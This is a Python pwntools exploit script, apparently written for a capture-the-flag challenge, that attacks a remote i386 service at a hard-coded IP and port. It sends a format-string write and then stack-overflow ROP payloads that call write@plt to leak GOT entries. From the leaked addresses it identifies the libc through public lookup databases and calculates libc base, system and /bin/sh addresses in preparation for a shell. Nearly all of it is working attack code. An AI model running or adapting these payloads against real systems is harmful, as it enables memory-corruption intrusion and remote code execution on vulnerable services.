from pwn import *
import time
import struct
import json

context(arch='i386', os='linux', log_level='info')

elf = ELF('d:/iscc/pwn2/pwn_permission')

HOST = '39.96.193.120'
PORT = 10000

def connect_and_trigger_vuln():
    conn = remote(HOST, PORT)
    data = conn.recv(timeout=5)
    log.info(f"Initial: {data[:100]}")
    
    target_val_addr = 0x804c030
    fmt_payload = b'%5c%6$na' + p32(target_val_addr)
    conn.send(fmt_payload)
    time.sleep(2)
    
    response = conn.recv(timeout=5)
    if b'Input:' not in response:
        log.error("vuln not triggered!")
        conn.close()
        return None
    
    log.success("vuln triggered! target_val set to 5")
    return conn

def leak_got_via_write(conn):
    write_plt = elf.plt['write']
    vuln_addr = elf.symbols['vuln']
    
    got_start = 0x804c000
    got_size = 0x40
    
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(got_start)
    payload += p32(got_size)
    
    conn.send(payload)
    time.sleep(2)
    
    response = conn.recv(timeout=5)
    return response

def leak_single_got(conn, func_name):
    write_plt = elf.plt['write']
    vuln_addr = elf.symbols['vuln']
    
    if func_name not in elf.got:
        log.warning(f"{func_name} not in GOT")
        return None
    
    got_addr = elf.got[func_name]
    
    payload = b'A' * 148
    payload += p32(write_plt)
    payload += p32(vuln_addr)
    payload += p32(1)
    payload += p32(got_addr)
    payload += p32(4)
    
    conn.send(payload)
    time.sleep(1)
    
    try:
        response = conn.recv(timeout=3)
        if len(response) >= 4:
            return u32(response[:4])
    except:
        pass
    return None

def query_libc_rip(leaked):
    try:
        import requests
    except ImportError:
        log.error("requests not installed: pip install requests")
        return []
    
    symbols_dict = {}
    for func_name, addr in leaked.items():
        symbols_dict[func_name] = hex(addr & 0xfff)
    
    log.info(f"Querying libc.rip with: {json.dumps({'symbols': symbols_dict})}")
    
    try:
        resp = requests.post("https://libc.rip/api/find", json={"symbols": symbols_dict}, timeout=15)
        if resp.status_code == 200:
            results = resp.json()
            return results
        else:
            log.warning(f"libc.rip returned status {resp.status_code}: {resp.text[:200]}")
    except Exception as e:
        log.warning(f"libc.rip query failed: {e}")
    
    return []

def query_libc_blukat(leaked):
    try:
        import requests
    except ImportError:
        return []
    
    symbols_dict = {}
    for func_name, addr in leaked.items():
        symbols_dict[func_name] = hex(addr & 0xfff)
    
    log.info(f"Querying libc.blukat.me with: {json.dumps({'symbols': symbols_dict})}")
    
    try:
        resp = requests.post("https://libc.blukat.me/api/find", json={"symbols": symbols_dict}, timeout=15)
        if resp.status_code == 200:
            results = resp.json()
            return results
    except Exception as e:
        log.warning(f"libc.blukat.me query failed: {e}")
    
    return []

def verify_libc_version(leaked, libc_info):
    symbols = libc_info.get('symbols', {})
    
    verified = True
    for func_name, actual_addr in leaked.items():
        if func_name in symbols:
            try:
                expected_offset = int(symbols[func_name], 16)
                actual_low12 = actual_addr & 0xfff
                expected_low12 = expected_offset & 0xfff
                if actual_low12 != expected_low12:
                    verified = False
                    log.warning(f"  {func_name}: low12 mismatch! actual=0x{actual_low12:03x} expected=0x{expected_low12:03x}")
            except:
                pass
    
    if len(leaked) >= 2:
        func_list = list(leaked.keys())
        for i in range(len(func_list)):
            for j in range(i+1, len(func_list)):
                f1, f2 = func_list[i], func_list[j]
                if f1 in symbols and f2 in symbols:
                    try:
                        off1 = int(symbols[f1], 16)
                        off2 = int(symbols[f2], 16)
                        expected_diff = off2 - off1
                        actual_diff = leaked[f2] - leaked[f1]
                        if expected_diff != actual_diff:
                            verified = False
                            log.warning(f"  {f2}-{f1}: diff mismatch! actual=0x{actual_diff:x} expected=0x{expected_diff:x}")
                    except:
                        pass
    
    return verified

def main():
    log.info("=== Step 1: Connect and trigger vuln ===")
    conn = connect_and_trigger_vuln()
    if not conn:
        return
    
    log.info("=== Step 2: Dump GOT table via write() ===")
    got_data = leak_got_via_write(conn)
    
    if not got_data or len(got_data) < 4:
        log.error("GOT dump failed!")
        conn.close()
        return
    
    log.info(f"Received {len(got_data)} bytes from GOT dump")
    
    got_start = 0x804c000
    
    leaked = {}
    print("\n" + "=" * 70)
    print("GOT Table Entries (Leaked Addresses):")
    print("=" * 70)
    
    for name, addr in sorted(elf.got.items(), key=lambda x: x[1]):
        offset = addr - got_start
        if 0 <= offset < len(got_data) - 3:
            value = u32(got_data[offset:offset+4])
            low12 = value & 0xfff
            print(f"  {name:25s} @GOT 0x{addr:08x} = 0x{value:08x}  (low12: 0x{low12:03x})")
            if 0xf7000000 < value < 0xf7ffffff:
                leaked[name] = value
        else:
            print(f"  {name:25s} @GOT 0x{addr:08x} = (out of dump range)")
    
    if not leaked:
        log.error("No valid libc addresses found in GOT dump!")
        conn.close()
        return
    
    print("\n" + "=" * 70)
    print("Valid Leaked libc Addresses:")
    print("=" * 70)
    for name, addr in leaked.items():
        low12 = addr & 0xfff
        print(f"  {name:25s} = 0x{addr:08x}  (low12: 0x{low12:03x})")
    
    print("\n" + "=" * 70)
    print("Function Offset Differences (unique fingerprint):")
    print("=" * 70)
    if 'puts' in leaked:
        for name, addr in leaked.items():
            if name != 'puts':
                diff = addr - leaked['puts']
                print(f"  {name} - puts = 0x{diff:x} ({diff})")
    
    if 'printf' in leaked and 'puts' in leaked:
        diff = leaked['printf'] - leaked['puts']
        print(f"\n  >>> KEY: printf - puts = 0x{diff:x}")
    if 'write' in leaked and 'puts' in leaked:
        diff = leaked['write'] - leaked['puts']
        print(f"  >>> KEY: write - puts = 0x{diff:x}")
    if 'read' in leaked and 'puts' in leaked:
        diff = leaked['read'] - leaked['puts']
        print(f"  >>> KEY: read - puts = 0x{diff:x}")
    if '__libc_start_main' in leaked and 'puts' in leaked:
        diff = leaked['__libc_start_main'] - leaked['puts']
        print(f"  >>> KEY: __libc_start_main - puts = 0x{diff:x}")
    
    log.info("=== Step 3: Also leak individual GOT entries for verification ===")
    for func_name in ['puts', 'printf', 'write', 'read', '__libc_start_main', 'setvbuf', 'memset']:
        if func_name in elf.got and func_name not in leaked:
            addr = leak_single_got(conn, func_name)
            if addr and 0xf7000000 < addr < 0xf7ffffff:
                leaked[func_name] = addr
                low12 = addr & 0xfff
                log.success(f"  {func_name}: 0x{addr:08x} (low12: 0x{low12:03x})")
            time.sleep(0.5)
    
    conn.close()
    
    log.info("=== Step 4: Query libc database ===")
    
    results = query_libc_rip(leaked)
    
    if not results:
        log.warning("libc.rip returned no results, trying libc.blukat.me...")
        results = query_libc_blukat(leaked)
    
    if results:
        print("\n" + "=" * 70)
        print(f"Found {len(results)} matching libc version(s):")
        print("=" * 70)
        
        verified_results = []
        
        for i, result in enumerate(results):
            lib_id = result.get('id', 'N/A')
            buildid = result.get('buildid', 'N/A')
            url = result.get('url', 'N/A')
            symbols = result.get('symbols', {})
            
            is_verified = verify_libc_version(leaked, result)
            
            print(f"\n--- Match #{i+1} {'[VERIFIED]' if is_verified else '[UNVERIFIED]'} ---")
            print(f"  ID: {lib_id}")
            print(f"  Build ID: {buildid}")
            print(f"  URL: {url}")
            
            key_syms = ['system', 'str_bin_sh', 'execve', '__libc_start_main', 
                        'puts', 'printf', 'write', 'read', 'setvbuf', 'memset']
            for sym_name in key_syms:
                if sym_name in symbols:
                    print(f"  {sym_name}: {symbols[sym_name]}")
            
            if is_verified:
                verified_results.append(result)
                
                if 'puts' in leaked and 'puts' in symbols:
                    try:
                        puts_offset = int(symbols['puts'], 16)
                        libc_base = leaked['puts'] - puts_offset
                        print(f"\n  >>> CALCULATED libc_base = 0x{libc_base:x}")
                        
                        if 'system' in symbols:
                            system_addr = libc_base + int(symbols['system'], 16)
                            print(f"  >>> CALCULATED system = 0x{system_addr:x}")
                        if 'str_bin_sh' in symbols:
                            binsh_addr = libc_base + int(symbols['str_bin_sh'], 16)
                            print(f"  >>> CALCULATED /bin/sh = 0x{binsh_addr:x}")
                        if 'execve' in symbols:
                            execve_addr = libc_base + int(symbols['execve'], 16)
                            print(f"  >>> CALCULATED execve = 0x{execve_addr:x}")
                    except:
                        pass
        
        if verified_results:
            best = verified_results[0]
            symbols = best.get('symbols', {})
            puts_offset = int(symbols['puts'], 16)
            libc_base = leaked['puts'] - puts_offset
            
            print("\n" + "=" * 70)
            print("BEST VERIFIED LIBC VERSION:")
            print("=" * 70)
            print(f"  ID: {best.get('id', 'N/A')}")
            print(f"  Build ID: {best.get('buildid', 'N/A')}")
            print(f"  libc_base: 0x{libc_base:x}")
            
            for sym_name in ['system', 'str_bin_sh', 'execve', '__libc_start_main', 
                            'puts', 'printf', 'write', 'read']:
                if sym_name in symbols:
                    offset = int(symbols[sym_name], 16)
                    addr = libc_base + offset
                    print(f"  {sym_name}: offset=0x{offset:x} addr=0x{addr:x}")
            
            with open('d:/iscc/pwn2/libc_info.json', 'w') as f:
                info = {
                    'libc_id': best.get('id', 'N/A'),
                    'buildid': best.get('buildid', 'N/A'),
                    'libc_base': hex(libc_base),
                    'leaked': {k: hex(v) for k, v in leaked.items()},
                    'offsets': {},
                    'addresses': {}
                }
                for sym_name in ['system', 'str_bin_sh', 'execve', '__libc_start_main',
                                'puts', 'printf', 'write', 'read']:
                    if sym_name in symbols:
                        offset = int(symbols[sym_name], 16)
                        info['offsets'][sym_name] = hex(offset)
                        info['addresses'][sym_name] = hex(libc_base + offset)
                
                json.dump(info, f, indent=2)
            
            log.success("libc info saved to libc_info.json")
        else:
            log.warning("No verified libc version found!")
    else:
        log.error("No matching libc found in database!")
        log.info("Try querying manually at https://libc.rip or https://libc.blukat.me")
        log.info("Use the low12 bits and offset differences printed above")

if __name__ == '__main__':
    main()
